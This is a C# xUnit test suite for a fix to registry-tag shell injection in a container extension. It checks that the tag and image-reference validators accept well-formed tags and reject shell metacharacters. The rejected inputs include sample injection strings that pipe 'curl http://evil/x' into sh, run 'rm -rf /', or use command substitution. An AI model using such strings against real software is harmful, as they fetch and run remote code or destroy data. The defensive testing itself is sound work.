using ContainerExtension.Registry;
using ContainerExtension.Validations;
using Xunit;

namespace ContainerExtension.UnitTests;

/// <summary>
/// Regression suite for the registry-tag injection fix (finding A.1). A registry-supplied tag is
/// interpolated into a command typed at OneWare's interactive terminal, which is a real shell. The
/// defense is two-layered: <see cref="RegistryClient.IsValidDockerTag"/> drops non-conforming tags at
/// the source, and <see cref="DockerImageFormatValidation.IsValidReference"/> re-checks the composed
/// image reference at the terminal sink. These tests assert both layers reject shell metacharacters
/// while admitting legitimate tags and references.
/// </summary>
public sealed class RegistryTagValidationTests
{
    [Theory]
    [InlineData("latest")]
    [InlineData("1.0.11")]
    [InlineData("2026-06-30")]
    [InlineData("v1.2.3_rc1")]
    [InlineData("stable")]
    [InlineData("_underscore-start")]
    public void IsValidDockerTag_AcceptsConformingTags(string tag)
    {
        Assert.True(RegistryClient.IsValidDockerTag(tag));
    }

    [Theory]
    [InlineData("")]
    [InlineData("x\";curl http://evil/x|sh;\"")]
    [InlineData("a b")]
    [InlineData("$(id)")]
    [InlineData("`id`")]
    [InlineData("tag;rm -rf /")]
    [InlineData(".dotstart")]
    [InlineData("-dashstart")]
    [InlineData("with/slash")]
    [InlineData("with:colon")]
    public void IsValidDockerTag_RejectsInjectionAndMalformed(string tag)
    {
        Assert.False(RegistryClient.IsValidDockerTag(tag));
    }

    [Fact]
    public void IsValidDockerTag_RejectsTagOverGrammarLength()
    {
        // Docker tag grammar caps the length at 128 characters.
        Assert.False(RegistryClient.IsValidDockerTag(new string('a', 129)));
        Assert.True(RegistryClient.IsValidDockerTag(new string('a', 128)));
    }

    [Theory]
    [InlineData("fentwums/oss-cad-suite:latest")]
    [InlineData("evil.example/toolchain:1.0")]
    [InlineData("ghcr.io/ns/repo:2026-06-30")]
    [InlineData("repo")]
    public void IsValidReference_AcceptsConformingReferences(string image)
    {
        Assert.True(DockerImageFormatValidation.IsValidReference(image));
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("evil/toolchain:x\";curl http://evil/x|sh;\"")]
    [InlineData("repo:tag;rm -rf /")]
    [InlineData("repo:$(id)")]
    [InlineData("repo:tag with space")]
    public void IsValidReference_RejectsShellMetacharacters(string? image)
    {
        Assert.False(DockerImageFormatValidation.IsValidReference(image));
    }
}
